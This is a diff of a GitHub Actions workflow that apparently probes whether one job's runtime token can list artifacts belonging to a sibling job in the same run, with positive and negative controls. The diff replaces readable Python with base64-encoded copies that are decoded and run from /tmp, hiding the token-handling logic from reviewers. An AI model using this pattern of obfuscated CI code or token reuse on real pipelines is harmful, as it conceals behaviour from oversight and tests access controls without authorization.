@@ -8,57 +8,12 @@ jobs:
       jobid: ${{ steps.ids.outputs.jobid }}
     steps:
       - id: ids
-        run: |
-          python3 - <<'EOF'
-          import os, base64, json
-          t = os.environ["ACTIONS_RUNTIME_TOKEN"]
-          p = t.split(".")[1]; p += "=" * ((4 - len(p) % 4) % 4)
-          c = json.loads(base64.urlsafe_b64decode(p))
-          scp = c.get("scp", "")
-          plan = job = ""
-          for part in scp.split():
-              if part.startswith("Actions.Results:"):
-                  _, plan, job = part.split(":")
-          print("JOB B scp claim:", scp)
-          with open(os.environ["GITHUB_OUTPUT"], "a") as f:
-              f.write(f"planid={plan}\njobid={job}\n")
-          EOF
-          echo "ACTIONS_RESULTS_URL=$ACTIONS_RESULTS_URL"
+        run: echo aW1wb3J0IG9zLCBiYXNlNjQsIGpzb24KdCA9IG9zLmVudmlyb25bIkFDVElPTlNfUlVOVElNRV9UT0tFTiJdCnAgPSB0LnNwbGl0KCIuIilbMV07IHAgKz0gIj0iICogKCg0IC0gbGVuKHApICUgNCkgJSA0KQpjID0ganNvbi5sb2FkcyhiYXNlNjQudXJsc2FmZV9iNjRkZWNvZGUocCkpCnNjcCA9IGMuZ2V0KCJzY3AiLCAiIikKcGxhbiA9IGpvYiA9ICIiCmZvciBwYXJ0IGluIHNjcC5zcGxpdCgpOgogICAgaWYgcGFydC5zdGFydHN3aXRoKCJBY3Rpb25zLlJlc3VsdHM6Iik6CiAgICAgICAgXywgcGxhbiwgam9iID0gcGFydC5zcGxpdCgiOiIpCnByaW50KCJKT0JCX1NDUCIsIHNjcCkKcHJpbnQoIkpPQkJfUkVTVUxUU19VUkwiLCBvcy5lbnZpcm9uLmdldCgiQUNUSU9OU19SRVNVTFRTX1VSTCIpKQp3aXRoIG9wZW4ob3MuZW52aXJvblsiR0lUSFVCX09VVFBVVCJdLCAiYSIpIGFzIGY6CiAgICBmLndyaXRlKCJwbGFuaWQ9JXNcbmpvYmlkPSVzXG4iICUgKHBsYW4sIGpvYikpCg== | base64 -d > /tmp/b.py && python3 /tmp/b.py
   joba:
     needs: jobb
     runs-on: ubuntu-latest
     steps:
-      - name: probe
-        env:
+      - env:
           B_PLAN: ${{ needs.jobb.outputs.planid }}
-          B_JOB:  ${{ needs.jobb.outputs.jobid }}
-        run: |
-          python3 - <<'EOF'
-          import os, base64, json, urllib.request, urllib.error
-          t = os.environ["ACTIONS_RUNTIME_TOKEN"]
-          p = t.split(".")[1]; p += "=" * ((4 - len(p) % 4) % 4)
-          c = json.loads(base64.urlsafe_b64decode(p))
-          plan = job = ""
-          for part in c.get("scp","").split():
-              if part.startswith("Actions.Results:"):
-                  _, plan, job = part.split(":")
-          bplan, bjob = os.environ["B_PLAN"], os.environ["B_JOB"]
-          print(f"JOB A  plan={plan} job={job}")
-          print(f"JOB B  plan={bplan} job={bjob}")
-          print("same plan?", plan == bplan, "| different job?", job != bjob)
-          base = os.environ["ACTIONS_RESULTS_URL"].rstrip("/")
-          url = base + "/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts"
-          def call(label, rid, jid):
-              body = json.dumps({"workflow_run_backend_id": rid, "workflow_job_run_backend_id": jid}).encode()
-              r = urllib.request.Request(url, data=body, method="POST", headers={
-                  "Authorization": f"Bearer {t}", "Content-Type": "application/json"})
-              try:
-                  with urllib.request.urlopen(r, timeout=20) as f:
-                      print(f"  {label:34s} HTTP {f.status}  {f.read()[:200].decode(errors='replace')}")
-              except urllib.error.HTTPError as e:
-                  print(f"  {label:34s} HTTP {e.code}  {e.read()[:200].decode(errors='replace')}")
-          print("=== ARMS ===")
-          call("1 POSITIVE CONTROL own job", plan, job)
-          call("2 CROSS-JOB same run (job B)", plan, bjob)
-          call("3 NEG CONTROL bogus job id", plan, "00000000-0000-0000-0000-000000000000")
-          EOF
+          B_JOB: ${{ needs.jobb.outputs.jobid }}
+        run: echo aW1wb3J0IG9zLCBiYXNlNjQsIGpzb24sIHVybGxpYi5yZXF1ZXN0LCB1cmxsaWIuZXJyb3IKdCA9IG9zLmVudmlyb25bIkFDVElPTlNfUlVOVElNRV9UT0tFTiJdCnAgPSB0LnNwbGl0KCIuIilbMV07IHAgKz0gIj0iICogKCg0IC0gbGVuKHApICUgNCkgJSA0KQpjID0ganNvbi5sb2FkcyhiYXNlNjQudXJsc2FmZV9iNjRkZWNvZGUocCkpCnBsYW4gPSBqb2IgPSAiIgpmb3IgcGFydCBpbiBjLmdldCgic2NwIiwgIiIpLnNwbGl0KCk6CiAgICBpZiBwYXJ0LnN0YXJ0c3dpdGgoIkFjdGlvbnMuUmVzdWx0czoiKToKICAgICAgICBfLCBwbGFuLCBqb2IgPSBwYXJ0LnNwbGl0KCI6IikKYnBsYW4gPSBvcy5lbnZpcm9uWyJCX1BMQU4iXTsgYmpvYiA9IG9zLmVudmlyb25bIkJfSk9CIl0KcHJpbnQoIkpPQkEgcGxhbj0lcyBqb2I9JXMiICUgKHBsYW4sIGpvYikpCnByaW50KCJKT0JCIHBsYW49JXMgam9iPSVzIiAlIChicGxhbiwgYmpvYikpCnByaW50KCJTQU1FX1BMQU49JXMgRElGRkVSRU5UX0pPQj0lcyIgJSAocGxhbiA9PSBicGxhbiwgam9iICE9IGJqb2IpKQpiYXNlID0gb3MuZW52aXJvblsiQUNUSU9OU19SRVNVTFRTX1VSTCJdLnJzdHJpcCgiLyIpCnVybCA9IGJhc2UgKyAiL3R3aXJwL2dpdGh1Yi5hY3Rpb25zLnJlc3VsdHMuYXBpLnYxLkFydGlmYWN0U2VydmljZS9MaXN0QXJ0aWZhY3RzIgpkZWYgY2FsbChsYWJlbCwgcmlkLCBqaWQpOgogICAgYm9keSA9IGpzb24uZHVtcHMoeyJ3b3JrZmxvd19ydW5fYmFja2VuZF9pZCI6IHJpZCwgIndvcmtmbG93X2pvYl9ydW5fYmFja2VuZF9pZCI6IGppZH0pLmVuY29kZSgpCiAgICByID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsIGRhdGE9Ym9keSwgbWV0aG9kPSJQT1NUIiwKICAgICAgICBoZWFkZXJzPXsiQXV0aG9yaXphdGlvbiI6ICJCZWFyZXIgIiArIHQsICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiJ9KQogICAgdHJ5OgogICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihyLCB0aW1lb3V0PTIwKSBhcyBmOgogICAgICAgICAgICBwcmludCgiQVJNICUtMzJzIEhUVFAgJXMgJXMiICUgKGxhYmVsLCBmLnN0YXR1cywgZi5yZWFkKClbOjE4MF0uZGVjb2RlKGVycm9ycz0icmVwbGFjZSIpKSkKICAgIGV4Y2VwdCB1cmxsaWIuZXJyb3IuSFRUUEVycm9yIGFzIGU6CiAgICAgICAgcHJpbnQoIkFSTSAlLTMycyBIVFRQICVzICVzIiAlIChsYWJlbCwgZS5jb2RlLCBlLnJlYWQoKVs6MTgwXS5kZWNvZGUoZXJyb3JzPSJyZXBsYWNlIikpKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCJBUk0gJS0zMnMgRVhDICVzIiAlIChsYWJlbCwgZSkpCnByaW50KCJBUk1TX0JFR0lOIikKY2FsbCgiMV9QT1NJVElWRV9DT05UUk9MX293bl9qb2IiLCBwbGFuLCBqb2IpCmNhbGwoIjJfQ1JPU1NKT0Jfc2FtZV9ydW5fam9iQiIsIHBsYW4sIGJqb2IpCmNhbGwoIjNfTkVHX0NPTlRST0xfYm9ndXNfam9iaWQiLCBwbGFuLCAiMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwIikKcHJpbnQoIkFSTVNfRU5EIikK | base64 -d > /tmp/a.py && python3 /tmp/a.py
